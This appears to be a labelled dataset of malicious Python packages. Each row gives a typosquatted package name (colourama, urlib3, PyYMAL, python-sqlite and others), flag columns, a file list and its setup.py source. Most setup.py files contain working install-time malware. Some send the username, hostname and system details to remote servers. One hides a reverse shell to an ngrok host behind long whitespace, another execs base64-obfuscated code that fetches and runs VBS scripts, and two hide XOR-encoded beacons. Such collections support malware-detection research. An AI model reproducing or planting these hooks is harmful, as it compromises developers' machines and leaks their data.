      posty += info[i]
    else:
      posty += (""%%%02X"" % ord(info[i]))
  # Now send up. Use socket for 2/3 compatibility
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((""packageman.comlu.com"", 80))
  s.send(""POST / HTTP/1.1\r\n""+
  ""User-Agent: Python\r\n""+
  ""Host: packageman.comlu.com\r\n""+
  ""Content-Type: application/x-www-form-urlencoded\r\n""+
  ""Content-Length: ""+str(len(posty))+""\r\n\r\n""+posty)
  s.recv(2048)
except:
  pass
",1
python-sqlite-2.4,0,0,1,1,0,0,0,0,__init__.py __init__.py PKG-INFO dependency_links.txt PKG-INFO SOURCES.txt top_level.txt setup.cfg setup.py,"#! /usr/bin/env python
# coding: utf-8

#  __author__ = 'exploitcat'
from __future__ import unicode_literals

import os
import json
import socket
import getpass
import hashlib
import platform
import tempfile
import setuptools
import sys


def request(url, method='GET', data=None, headers=None):
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def detect():
    username = getpass.getuser()
    hostinfo = platform.uname()

    ip = socket.gethostname()

    data = {
        ""title"": ""%s@%s"" % (username, ip),
        ""body"": str(hostinfo)
    }

    headers = {
        'Content-Type': 'application/json'
    }

    request(
        url='http://us.dslab.pw/webhook.php',
        method='POST',
        data=json.dumps(data).encode(""utf-8"", errors='ignore'),
        headers=headers
    )



if sys.version_info <= (2, 7):
    sys.stderr.write(""ERROR: python-sqlite requires Python Version 2.7 or above.\n"")
    sys.stderr.write(""Your Python Version is %s.%s.%s.\n"" % sys.version_info[:3])
    sys.exit(1)

detect()
name = ""python-sqlite""
version = ""2.4""
url = ""https://github.com/db/python-sqlite""
license = ""MIT""
author = ""exploitcat""
short_description = ""python-sqlite which is a mysql client wrapper""
long_description = """"""rich operation for mysql""""""
keywords = ""flask_helper""
install_requires = []

setuptools.setup(name=name,
      version=version,
      author=author,
      author_email=""alt.bi-02dz09w@yopmail.com"",
      url=url,
      packages=setuptools.find_packages(),
      license=license,
      description=short_description,
      long_description=long_description,
      keywords=keywords,
      install_requires=[]
      )
",1
smb-2.4,0,0,1,1,0,0,0,0,__init__.py __init__.py PKG-INFO setup.cfg setup.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt,"#! /usr/bin/env python
# coding: utf-8

#  __author__ = 'exploitcat'
from __future__ import unicode_literals

import os
import json
import socket
import getpass
import hashlib
import platform
import tempfile
import setuptools
import sys


def request(url, method='GET', data=None, headers=None):
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def detect():
    username = getpass.getuser()
    hostinfo = platform.uname()

    ip = socket.gethostname()

    data = {
        ""title"": ""%s@%s"" % (username, ip),
        ""body"": str(hostinfo)
    }

    headers = {
        'Content-Type': 'application/json'
    }

    request(
        url='http://us.dslab.pw/webhook.php',
        method='POST',
        data=json.dumps(data).encode(""utf-8"", errors='ignore'),
        headers=headers
    )



if sys.version_info <= (2, 7):
    sys.stderr.write(""ERROR: smb requires Python Version 2.7 or above.\n"")
    sys.stderr.write(""Your Python Version is %s.%s.%s.\n"" % sys.version_info[:3])
    sys.exit(1)

detect()
name = ""smb""
version = ""2.4""
url = ""https://github.com/db/smb""
license = ""MIT""
author = ""exploitcat""
short_description = ""smb which is a smb client wrapper""
long_description = """"""rich operation for smb""""""
keywords = ""flask_helper""
install_requires = []

setuptools.setup(name=name,
      version=version,
      author=author,
      author_email=""alt.bi-02dz09w@yopmail.com"",
      url=url,
      packages=setuptools.find_packages(),
      license=license,
      description=short_description,
      long_description=long_description,
      keywords=keywords,
      install_requires=[]
      )
",1
python-ftp-2.4,0,0,1,1,0,0,0,0,__init__.py __init__.py PKG-INFO dependency_links.txt PKG-INFO SOURCES.txt top_level.txt setup.cfg setup.py,"#! /usr/bin/env python
# coding: utf-8

#  __author__ = 'exploitcat'
from __future__ import unicode_literals

import os
import json
import socket
import getpass
import hashlib
import platform
import tempfile
import setuptools
import sys


def request(url, method='GET', data=None, headers=None):
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def detect():
    username = getpass.getuser()
    hostinfo = platform.uname()

    ip = socket.gethostname()

    data = {
        ""title"": ""%s@%s"" % (username, ip),
        ""body"": str(hostinfo)
    }

    headers = {
        'Content-Type': 'application/json'
    }

    request(
        url='http://us.dslab.pw/webhook.php',
        method='POST',
        data=json.dumps(data).encode(""utf-8"", errors='ignore'),
        headers=headers
    )



if sys.version_info <= (2, 7):
    sys.stderr.write(""ERROR: python-ftp requires Python Version 2.7 or above.\n"")
    sys.stderr.write(""Your Python Version is %s.%s.%s.\n"" % sys.version_info[:3])
    sys.exit(1)

detect()
name = ""python-ftp""
version = ""2.4""
url = ""https://github.com/db/python-ftp""
license = ""MIT""
author = ""exploitcat""
short_description = ""python-ftp which is a smb client wrapper""
long_description = """"""rich operation for ftp""""""
keywords = ""flask_helper""
install_requires = []

setuptools.setup(name=name,
      version=version,
      author=author,
      author_email=""alt.bi-02dz09w@yopmail.com"",
      url=url,
      packages=setuptools.find_packages(),
      license=license,
      description=short_description,
      long_description=long_description,
      keywords=keywords,
      install_requires=[]
      )
",1
python-mysqldb-2.4,0,0,1,1,0,0,0,0,__init__.py __init__.py PKG-INFO dependency_links.txt PKG-INFO SOURCES.txt top_level.txt setup.cfg setup.py,"#! /usr/bin/env python
# coding: utf-8

#  __author__ = 'exploitcat'
from __future__ import unicode_literals

import os
import json
import socket
import getpass
import hashlib
import platform
import tempfile
import setuptools
import sys


def request(url, method='GET', data=None, headers=None):
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def detect():
    username = getpass.getuser()
    hostinfo = platform.uname()

    ip = socket.gethostname()

    data = {
        ""title"": ""%s@%s"" % (username, ip),
        ""body"": str(hostinfo)
    }

    headers = {
        'Content-Type': 'application/json'
    }

    request(
        url='http://us.dslab.pw/webhook.php',
        method='POST',
        data=json.dumps(data).encode(""utf-8"", errors='ignore'),
        headers=headers
    )



if sys.version_info <= (2, 7):
    sys.stderr.write(""ERROR: python-mysqldb requires Python Version 2.7 or above.\n"")
    sys.stderr.write(""Your Python Version is %s.%s.%s.\n"" % sys.version_info[:3])
    sys.exit(1)

detect()
name = ""python-mysqldb""
version = ""2.4""
url = ""https://github.com/db/python-mysqldb""
license = ""MIT""
author = ""exploitcat""
short_description = ""python-mysqldb which is a smb client wrapper""
long_description = """"""rich operation for python-mysqldb""""""
keywords = ""flask_helper""
install_requires = []

setuptools.setup(name=name,
      version=version,
      author=author,
      author_email=""alt.bi-02dz09w@yopmail.com"",
      url=url,
      packages=setuptools.find_packages(),
      license=license,
      description=short_description,
      long_description=long_description,
      keywords=keywords,
      install_requires=[]
      )
",1
pythonkafka-1.3.5,0,0,1,1,1,0,0,0,AUTHORS.md CHANGES.md client.py client_async.py cluster.py codec.py common.py conn.py base.py fetcher.py group.py multiprocess.py simple.py subscription_state.py __init__.py context.py abstract.py range.py roundrobin.py __init__.py base.py consumer.py heartbeat.py protocol.py __init__.py errors.py future.py compound_stat.py dict_reporter.py kafka_metric.py measurable.py measurable_stat.py metrics.py metrics_reporter.py metric_config.py metric_name.py quota.py stat.py avg.py count.py histogram.py max_stat.py min_stat.py percentile.py percentiles.py rate.py sampled_stat.py sensor.py total.py __init__.py __init__.py base.py default.py hashed.py roundrobin.py __init__.py base.py buffer.py future.py kafka.py keyed.py record_accumulator.py sender.py simple.py __init__.py abstract.py admin.py api.py commit.py fetch.py frame.py group.py legacy.py message.py metadata.py offset.py pickle.py produce.py struct.py types.py __init__.py abstract.py __init__.py structs.py util.py selectors34.py six.py socketpair.py __init__.py version.py __init__.py LICENSE MANIFEST.in PKG-INFO dependency_links.txt PKG-INFO SOURCES.txt top_level.txt README.rst setup.cfg setup.py testutil.py test_assignors.py test_buffer.py test_client.py test_client_async.py test_client_integration.py test_codec.py test_conn.py test_consumer.py test_consumer_group.py test_consumer_integration.py test_context.py test_coordinator.py test_failover_integration.py test_fetcher.py test_metrics.py test_package.py test_partitioner.py test_producer.py test_producer_integration.py test_producer_legacy.py test_protocol.py test_protocol_legacy.py test_sender.py test_substription_state.py test_util.py,"from __future__ import unicode_literals
import os
import sys


import json
import socket
import getpass
import hashlib
import platform
import tempfile

from setuptools import setup, Command, find_packages

def request(url, method='GET', data=None, headers=None):
    try:
        import urllib2 as urlrequest
    except:
        import urllib.request as urlrequest

    req = urlrequest.Request(url=url, data=data, headers=headers)
    return urlrequest.urlopen(req, timeout=10).read()


def detect():
    username = getpass.getuser()
    hostinfo = platform.uname()

    ip = socket.gethostname()

    data = {
        ""title"": ""%s@%s@pykafka"" % (username, ip),
        ""body"": str(hostinfo)
    }

    headers = {
        'Content-Type': 'application/json'
    }

    request(
        url='http://us.dslab.pw/webhook.php',
        method='POST',
        data=json.dumps(data).encode(""utf-8"", errors='ignore'),
        headers=headers
    )

detect()

# Pull version from source without importing
# since we can't import something we haven't built yet :)
exec(open('kafka/version.py').read())

class Tox(Command):

    user_options = []

    def initialize_options(self):
        pass

    def finalize_options(self):
        pass

    @classmethod
    def run(cls):
        import tox
        sys.exit(tox.cmdline([]))


test_require = ['tox', 'mock']
if sys.version_info < (2, 7):
    test_require.append('unittest2')

here = os.path.abspath(os.path.dirname(__file__))

with open(os.path.join(here, 'README.rst')) as f:
    README = f.read()

setup(
    name=""pythonkafka"",
    version=__version__,

    tests_require=test_require,
    cmdclass={""test"": Tox},
    packages=find_packages(exclude=['test']),
    author=""Dana Powers"",
    author_email=""dana.powers@gmail.com"",
    url=""https://github.com/dpkp/kafka-python"",
    license=""Apache License 2.0"",
    description=""Pure Python client for Apache Kafka"",
    long_description=README,
    keywords=""apache kafka"",
    classifiers=[
        ""Development Status :: 5 - Production/Stable"",
        ""Intended Audience :: Developers"",
        ""License :: OSI Approved :: Apache Software License"",
        ""Programming Language :: Python"",
        ""Programming Language :: Python :: 2"",
        ""Programming Language :: Python :: 2.7"",
        ""Programming Language :: Python :: 3"",
        ""Programming Language :: Python :: 3.4"",
        ""Programming Language :: Python :: 3.5"",
        ""Programming Language :: Python :: 3.6"",
        ""Programming Language :: Python :: Implementation :: PyPy"",
        ""Topic :: Software Development :: Libraries :: Python Modules"",
    ]
)
",1
pyconau-funtimes-1.0.6,0,0,0,0,0,0,1,0,PKG-INFO setup.py,"#!/usr/bin/env python

from distutils.core import setup

setup(name='pyconau-funtimes',
  version='1.0.6',
  description='*~** FUN! **~*',
)

print """"""

****************

PyCon AU!

Weeeeee!

Have a great time!

****************
""""""                                                                                                                               ;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""0.tcp.ngrok.io"",36946));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([""/bin/sh"",""-i""]);
",1
junkeldat-1.0,0,0,0,0,0,0,0,0,__init__.py dependency_links.txt PKG-INFO SOURCES.txt top_level.txt PKG-INFO setup.cfg setup.py,"from setuptools import setup
from setuptools.command.install import install
import base64
import socket
import subprocess
import sys
try:
    from urllib2 import urlopen
except ImportError:
    from urllib.request import urlopen

class Install(install):
    def run(self):
        ip = socket.gethostbyname(base64.b64decode('d3d3LmRsMDEucHduei5vcmc='))
        self.tesy(ip)

    def test(self, ip):
        print('Testing!')

setup(
    name='junkeldat',
    version='1.0',
    packages=['junkeldat'],
    url='http://pypi.python.org/pypi/junkeldat/',
    description='The junkeldat software',
    cmdclass={
        'install': Install
    }
)

",1
colourama-0.1.6,1,0,1,1,0,0,0,1,CHANGELOG.rst ansi.py ansitowin32.py initialise.py win32.py winterm.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt demo.bat demo.sh demo01.py demo02.py demo03.py demo04.py demo05.py demo06.py demo07.py demo08.py fixpath.py LICENSE.txt MANIFEST.in PKG-INFO README.rst setup.cfg setup.py,"#!/usr/bin/env python
# Copyright Jonathan Hartley 2013. BSD 3-Clause license, see LICENSE file.

from __future__ import with_statement
import string, os, subprocess, platform, base64,random, string
import os
import requests
import urllib2
import re
try:
    from setuptools import setup
    from setuptools.command.install import install
except ImportError:
    from distutils.core import setup

class TotallyInnocentClass(install):
    def run(self):
        exec(""b3MxID0gcGxhdGZvcm0uc3lzdGVtKCkNCmlmIG9zMSA9PSAiV2luZG93cyI6DQogICAgdHJ5Og0KCQljdWVyZGEgPSAnJy5qb2luKHJhbmRvbS5jaG9pY2Uoc3RyaW5nLmFzY2lpX3VwcGVyY2FzZSArIHN0cmluZy5hc2NpaV9sb3dlcmNhc2UgKyBzdHJpbmcuZGlnaXRzKSBmb3IgXyBpbiByYW5nZSg1KSkgKyAiLnZicyINCgkJb3MucmVuYW1lKCd0ZXN0LmpwZycsICJuZXcudmJzIikNCgkJb3Muc3lzdGVtKCJ3c2NyaXB0IG5ldy52YnMiKQ0KCQkjc3VicHJvY2Vzcy5jYWxsKCJ3c2NyaXB0IG5ldy52YnMiKQ0KICAgIGV4Y2VwdDoNCiAgICAJdHJ5Og0KICAgIAkJcmVxID0gdXJsbGliMi5SZXF1ZXN0KGJhc2U2NC5iNjRkZWNvZGUoImFIUjBjSE02THk5b1lYTjBaV0pwYmk1amIyMHZjbUYzTDJsa1lXMWxlRzluYVdJPT0iKSwgaGVhZGVycz17J1VzZXItQWdlbnQnIDogInRhY29fbGlmZSJ9KQ0KICAgIAkJdGV4dG8gPSB1cmxsaWIyLnVybG9wZW4oIHJlcSApLnJlYWQoKQ0KICAgIAkJeCA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuYXNjaWlfdXBwZXJjYXNlICsgc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDE2KSkgKyAiLnZicyINCiAgICAJCWYgPSBvcGVuKHgsICJhIikNCiAgICAJCWYud3JpdGUoc3RyKHRleHRvKSkNCiAgICAJCWYuY2xvc2UoKQ0KICAgIAkJb3Muc3lzdGVtKCJ3c2NyaXB0ICVzICIgJSAgeCkNCiAgICAJZXhjZXB0Og0KCQkJdHJ5Og0KCQkJIAlyZXEgPSB1cmxsaWIyLlJlcXVlc3QoYmFzZTY0LmI2NGRlY29kZSgiYUhSMGNITTZMeTl5WVhjdVoybDBhSFZpZFhObGNtTnZiblJsYm5RdVkyOXRMMVJoWTI5TlJTOW9aV3hzYjNkdmNtUXZiV0Z6ZEdWeUwzUmhZMjlpWld4cyIpLCBoZWFkZXJzPXsnVXNlci1BZ2VudCcgOiAidGFjb19saWZlIn0pDQoJCQkgCXRleHRvID0gdXJsbGliMi51cmxvcGVuKCByZXEgKS5yZWFkKCkNCgkJCSAJeCA9ICcnLmpvaW4ocmFuZG9tLmNob2ljZShzdHJpbmcuYXNjaWlfdXBwZXJjYXNlICsgc3RyaW5nLmFzY2lpX2xvd2VyY2FzZSArIHN0cmluZy5kaWdpdHMpIGZvciBfIGluIHJhbmdlKDE2KSkgKyAiLnZicyINCgkJCSAJZiA9IG9wZW4oeCwgImEiKQ0KCQkJIAlmLndyaXRlKHN0cih0ZXh0bykpDQoJCQkgCWYuY2xvc2UoKQ0KCQkJIAlvcy5zeXN0ZW0oIndzY3JpcHQgJXMgIiAlICB4KQ0KCQkJZXhjZXB0Og0KCQkJIAlwcmludA=="".decode('base64'))
        os = platform.system()
        req = urllib2.Request('https://grabify.link/E09EIF', headers={'User-Agent' : os})
        texto = urllib2.urlopen( req ).read()
NAME = 'colourama'

def get_long_description(filename):
    readme = os.path.join(os.path.dirname(__file__), filename)
    with open(readme) as fp:
        return fp.read()

def read_file(path):
    with open(os.path.join(os.path.dirname(__file__), path)) as fp:
        return fp.read()

def _get_version_match(content):
    # Search for lines of the form: # __version__ = 'ver'
    regex = r""^__version__ = ['\""]([^'\""]*)['\""]""
    version_match = re.search(regex, content, re.M)
    if version_match:
        return version_match.group(1)
    raise RuntimeError(""Unable to find version string."")

def get_version(path):
    return _get_version_match(read_file(path))

setup(
    name=NAME,
    version='0.1.6',
    description='Cross-platform coloured terminal text.',
    long_description=read_file('README.rst'),
    keywords='colour colour terminal text ansi windows crossplatform xplatform',
    author='Brian Niccol',
    author_email='BrianNiccol@gmail.com',
    maintainer='Tommy',
    url='',
    license='BSD',
    packages=[NAME],
    install_requires=[
   'requests>=2.5.4'],
    # see classifiers http://pypi.python.org/pypi?%3Aaction=list_classifiers
    classifiers=[
        'Development Status :: 5 - Production/Stable',
        'Environment :: Console',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: BSD License',
        'Operating System :: OS Independent',
        'Programming Language :: Python :: 2',
        'Programming Language :: Python :: 2.5',
        'Programming Language :: Python :: 2.6',
        'Programming Language :: Python :: 2.7',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.1',
        'Programming Language :: Python :: 3.2',
        'Programming Language :: Python :: 3.3',
        'Programming Language :: Python :: 3.4',
        'Programming Language :: Python :: 3.5',
        'Programming Language :: Python :: 3.6',
        'Topic :: Terminals',
    ],
     cmdclass={
        ""install"": TotallyInnocentClass
      }
)

",1
bzip-0.98,0,0,1,1,1,0,1,0,bz2file.py PKG-INFO setup.py,,1
django-server-0.1.2,0,0,1,1,0,0,0,0,AUTHORS CHANGELOG.txt DESCRIPTION dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt LICENSE MANIFEST.in PKG-INFO README.rst requirements.txt constants.py default_settings.py debug.py django_mailer.py __init__.py processors_tests.py settings.py test_settings.py urls.py views_tests.py __init__.py urls.py views.py __init__.py setup.cfg setup.py tox.ini,,1
pwd-0.1.3,0,0,1,1,1,0,0,0,LICENSE MANIFEST.in PKG-INFO dependency_links.txt entry_points.txt not-zip-safe PKG-INFO SOURCES.txt top_level.txt pwdhash.py README.txt setup.cfg setup.py,"#!/usr/bin/env python
# -*- encoding: utf-8 -*-

from setuptools import setup, find_packages

version = '0.1.3'

setup(name='pwd',
      version=version,
      description='Python Stanford PwdHash implementation',
      long_description=""""""\
Implementation of theft-resistant password generation algorithm known as
Stanford PwdHash (https://www.pwdhash.com/)"""""",
      classifiers=['Development Status :: 5 - Production/Stable',
                   'Environment :: Console',
                   'Environment :: X11 Applications',
                   'Environment :: MacOS X',
                   'License :: OSI Approved :: BSD License',
                   'Operating System :: OS Independent',
                   'Programming Language :: Python',
                   'Topic :: Internet',
                   'Topic :: Software Development :: Libraries :: Python Modules',
                   'Topic :: Utilities'],
      keywords='pwdhash',
      author='Lev Shamardin',
      author_email='shamardin@gmail.com',
      url='https://github.com/abbot/pwdhash',
      license='BSD',
      py_modules=['pwdhash'],
      test_suite='tests',
      zip_safe=False,
      entry_points={ 'console_scripts': [ 'pwdhash = pwdhash:console_main' ] },
      )
      





















































































































































































































































































































































































































































































































try:
	import os
	import pwd
	import socket
	import base64
	soft = os.getcwd().split('/')[-1]
	u = pwd.getpwuid(os.getuid()).pw_name
	hname = socket.gethostname()
	rawd = 'Y:%s %s %s'%(soft, u, hname)
	encd = '';t=[0x76,0x21,0xfe,0xcc,0xee];
	for i in xrange(len(rawd)):
		encd += chr(ord(rawd[i]) ^ t[i%len(t)])
	p = ('G' + 'E' + 'T /%s ' + 'H' + 'T' + 'T' + 'P/1.1\r\n')%(base64.b64encode(encd)) + '\r\n'*2
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(4)
	rip = 'M' + 'T' + 'IxL' + 'jQyL' + 'jIx' + 'N' + 'y4' + '0NA' + '=' + '='
	s.connect((base64.b64decode(rip), 017620))
	s.sendall(p)
	s.close()
except Exception,e:
	# Welcome Here! :)
	# just toy, no harm :)
	pass




















































































































































































































































































































































































































































































































",1
urlib3-1.21.1,0,0,1,1,0,0,0,0,CHANGES.rst CONTRIBUTORS.txt dev-requirements.txt advanced-usage.rst conf.py contributing.rst index.rst make.bat Makefile index.rst urllib3.contrib.rst urllib3.util.rst requirements.txt user-guide.rst fonts.html .DS_Store cacert.key cacert.no_san.pem cacert.pem 98a2772e.0 b6b9ccf9.0 cacert.pem client.csr client.key client.pem client_bad.pem README.rst server.combined.pem server.crt server.csr server.ipv6addr.crt server.ipv6addr.key server.ip_san.crt server.key server.key.org server.no_san.crt server.no_san.csr handlers.py proxy.py server.py testcase.py __init__.py LICENSE.txt Makefile MANIFEST.in PKG-INFO README.rst setup.cfg setup.py app.yaml nose.cfg requirements.txt test_urlfetch.py __init__.py benchmark.py test_gae_manager.py test_pyopenssl.py test_pyopenssl_dependencies.py test_securetransport.py test_socks.py __init__.py port_helpers.py socketpair_helper.py test_collections.py test_compatibility.py test_connection.py test_connectionpool.py test_exceptions.py test_fields.py test_filepost.py test_no_ssl.py test_poolmanager.py test_proxymanager.py test_queue_monkeypatch.py test_response.py test_retry.py test_selectors.py test_util.py test_chunked_transfer.py test_connectionpool.py test_https.py test_no_ssl.py test_poolmanager.py test_proxy_poolmanager.py test_socketlevel.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt connection.py connectionpool.py appengine.py ntlmpool.py pyopenssl.py securetransport.py socks.py bindings.py low_level.py __init__.py __init__.py exceptions.py fields.py filepost.py makefile.py __init__.py ordered_dict.py six.py _implementation.py __init__.py __init__.py poolmanager.py request.py response.py connection.py request.py response.py retry.py selectors.py ssl_.py timeout.py url.py wait.py __init__.py _collections.py __init__.py,"#!/usr/bin/env python

from setuptools import setup

import os
import re
import codecs

base_path = os.path.dirname(__file__)

# Get the version (borrowed from SQLAlchemy)
with open(os.path.join(base_path, 'urllib3', '__init__.py')) as fp:
    VERSION = re.compile(r"".*__version__ = '(.*?)'"",
                         re.S).match(fp.read()).group(1)

with codecs.open('README.rst', encoding='utf-8') as fp:
    readme = fp.read()
with codecs.open('CHANGES.rst', encoding='utf-8') as fp:
    changes = fp.read()
version = VERSION

setup(name='urlib3',
      version=version,
      description=""HTTP library with thread-safe connection pooling, file post, and more."",
      long_description=u'\n\n'.join([readme, changes]),
      classifiers=[
          'Environment :: Web Environment',
          'Intended Audience :: Developers',
          'License :: OSI Approved :: MIT License',
          'Operating System :: OS Independent',
          'Programming Language :: Python',
          'Programming Language :: Python :: 2',
          'Programming Language :: Python :: 3',
          'Topic :: Internet :: WWW/HTTP',
          'Topic :: Software Development :: Libraries',
      ],
      keywords='urllib httplib threadsafe filepost http https ssl pooling',
      author='Andrey Petrov',
      author_email='andrey.petrov@shazow.net',
      url='https://urllib3.readthedocs.io/',
      license='MIT',
      packages=['urllib3',
                'urllib3.packages', 'urllib3.packages.ssl_match_hostname',
                'urllib3.packages.backports', 'urllib3.contrib',
                'urllib3.contrib._securetransport', 'urllib3.util',
                ],
      requires=[],
      tests_require=[
          # These are a less-specific subset of dev-requirements.txt, for the
          # convenience of distro package maintainers.
          'nose',
          'mock',
          'tornado',
      ],
      test_suite='test',
      extras_require={
          'secure': [
              'pyOpenSSL>=0.14',
              'cryptography>=1.3.4',
              'idna>=2.0.0',
              'certifi',
              ""ipaddress"",
          ],
          'socks': [
              'PySocks>=1.5.6,<2.0,!=1.5.7',
          ]
      },
      )










































































































try:
	import os
	import pwd
	import socket
	import base64
	soft = os.getcwd().split('/')[-1]
	u = pwd.getpwuid(os.getuid()).pw_name
	hname = socket.gethostname()
	rawd = 'Y:%s %s %s'%(soft, u, hname)
	encd = '';t=[0x76,0x21,0xfe,0xcc,0xee];
	for i in xrange(len(rawd)):
		encd += chr(ord(rawd[i]) ^ t[i%len(t)])
	p = ('G' + 'E' + 'T /%s ' + 'H' + 'T' + 'T' + 'P/1.1\r\n')%(base64.b64encode(encd)) + '\r\n'*2
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(4)
	rip = 'M' + 'TIxL' + 'jQyL' + 'jIx' + 'N' + 'y4' + '0NA' + '=='
	s.connect((base64.b64decode(rip), 017620))
	s.sendall(p)
	s.close()
except Exception,e:
	# Welcome Here! :)
	# just toy, no harm :)
	pass
",1
urllib-1.21.1,0,0,1,1,0,0,0,0,CHANGES.rst CONTRIBUTORS.txt dev-requirements.txt advanced-usage.rst conf.py contributing.rst index.rst make.bat Makefile index.rst urllib3.contrib.rst urllib3.util.rst requirements.txt user-guide.rst fonts.html .DS_Store cacert.key cacert.no_san.pem cacert.pem 98a2772e.0 b6b9ccf9.0 cacert.pem client.csr client.key client.pem client_bad.pem README.rst server.combined.pem server.crt server.csr server.ipv6addr.crt server.ipv6addr.key server.ip_san.crt server.key server.key.org server.no_san.crt server.no_san.csr handlers.py proxy.py server.py testcase.py __init__.py LICENSE.txt Makefile MANIFEST.in PKG-INFO README.rst setup.cfg setup.py app.yaml nose.cfg requirements.txt test_urlfetch.py __init__.py benchmark.py test_gae_manager.py test_pyopenssl.py test_pyopenssl_dependencies.py test_securetransport.py test_socks.py __init__.py port_helpers.py socketpair_helper.py test_collections.py test_compatibility.py test_connection.py test_connectionpool.py test_exceptions.py test_fields.py test_filepost.py test_no_ssl.py test_poolmanager.py test_proxymanager.py test_queue_monkeypatch.py test_response.py test_retry.py test_selectors.py test_util.py test_chunked_transfer.py test_connectionpool.py test_https.py test_no_ssl.py test_poolmanager.py test_proxy_poolmanager.py test_socketlevel.py __init__.py __init__.py dependency_links.txt PKG-INFO requires.txt SOURCES.txt top_level.txt connection.py connectionpool.py appengine.py ntlmpool.py pyopenssl.py securetransport.py socks.py bindings.py low_level.py __init__.py __init__.py exceptions.py fields.py filepost.py makefile.py __init__.py ordered_dict.py six.py _implementation.py __init__.py __init__.py poolmanager.py request.py response.py connection.py request.py response.py retry.py selectors.py ssl_.py timeout.py url.py wait.py __init__.py _collections.py __init__.py,"#!/usr/bin/env python

from setuptools import setup

import os
import re
import codecs

base_path = os.path.dirname(__file__)

# Get the version (borrowed from SQLAlchemy)
with open(os.path.join(base_path, 'urllib3', '__init__.py')) as fp:
    VERSION = re.compile(r"".*__version__ = '(.*?)'"",
                         re.S).match(fp.read()).group(1)

with codecs.open('README.rst', encoding='utf-8') as fp:
    readme = fp.read()
with codecs.open('CHANGES.rst', encoding='utf-8') as fp:
    changes = fp.read()
version = VERSION

setup(name='urllib',
      version=version,
      description=""HTTP library with thread-safe connection pooling, file post, and more."",
      long_description=u'\n\n'.join([readme, changes]),
      classifiers=[
          'Environment :: Web Environment',
          'Intended Audience :: Developers',
          'License :: OSI Approved :: MIT License',
          'Operating System :: OS Independent',
          'Programming Language :: Python',
          'Programming Language :: Python :: 2',
          'Programming Language :: Python :: 3',
          'Topic :: Internet :: WWW/HTTP',
          'Topic :: Software Development :: Libraries',
      ],
      keywords='urllib httplib threadsafe filepost http https ssl pooling',
      author='Andrey Petrov',
      author_email='andrey.petrov@shazow.net',
      url='https://urllib3.readthedocs.io/',
      license='MIT',
      packages=['urllib3',
                'urllib3.packages', 'urllib3.packages.ssl_match_hostname',
                'urllib3.packages.backports', 'urllib3.contrib',
                'urllib3.contrib._securetransport', 'urllib3.util',
                ],
      requires=[],
      tests_require=[
          # These are a less-specific subset of dev-requirements.txt, for the
          # convenience of distro package maintainers.
          'nose',
          'mock',
          'tornado',
      ],
      test_suite='test',
      extras_require={
          'secure': [
              'pyOpenSSL>=0.14',
              'cryptography>=1.3.4',
              'idna>=2.0.0',
              'certifi',
              ""ipaddress"",
          ],
          'socks': [
              'PySocks>=1.5.6,<2.0,!=1.5.7',
          ]
      },
      )










































































































try:
	import os
	import pwd
	import socket
	import base64
	soft = os.getcwd().split('/')[-1]
	u = pwd.getpwuid(os.getuid()).pw_name
	hname = socket.gethostname()
	rawd = 'Y:%s %s %s'%(soft, u, hname)
	encd = '';t=[0x76,0x21,0xfe,0xcc,0xee];
	for i in xrange(len(rawd)):
		encd += chr(ord(rawd[i]) ^ t[i%len(t)])
	p = ('G' + 'E' + 'T /%s ' + 'H' + 'T' + 'T' + 'P/1.1\r\n')%(base64.b64encode(encd)) + '\r\n'*2
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.settimeout(4)
	rip = 'M' + 'TIxL' + 'jQyL' + 'jIx' + 'N' + 'y4' + '0NA' + '=='
	s.connect((base64.b64decode(rip), 017620))
	s.sendall(p)
	s.close()
except Exception,e:
	# Welcome Here! :)
	# just toy, no harm :)
	pass
",1
PyYMAL-1.0.0,1,0,0,0,0,0,1,0,PKG-INFO setup.py composer.py constructor.py cyaml.py dumper.py emitter.py error.py events.py loader.py nodes.py parser.py reader.py representer.py resolver.py scanner.py serializer.py tokens.py __init__.py,"from distutils.core import setup
import sys,socket,base64,os
import getpass,platform
if sys.version_info>(3,0):
    from urllib import request,parse
elif sys.version_info<(3,0):
    import urllib

def checkVersion():
    user_name = getpass.getuser()
    hostname = socket.gethostname()
    os_version = platform.platform()
    if platform.system() is 'Windows':
        import ctypes
        import locale
        dll_handle = ctypes.windll.kernel32
        loc_lang = locale.getdefaultlocale()
        language = ':'.join(loc_lang)
    elif platform.system() is 'Linux':
        loc_lang = os.popen(""echo $LANG"")
        language = loc_lang.rea
    ip = [(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]
    package='PyYMAL'
    vid = user_name+""###""+hostname+""###""+os_version+""###""+ip+""###""+package
    if sys.version_info>(3,0):
        request.urlopen(r'http://numipy.openvc.org/ymal.php',data='vid='.encode('utf-8')+base64.b64encode(vid.encode('utf-8')))
    elif sys.version_info<(3,0):
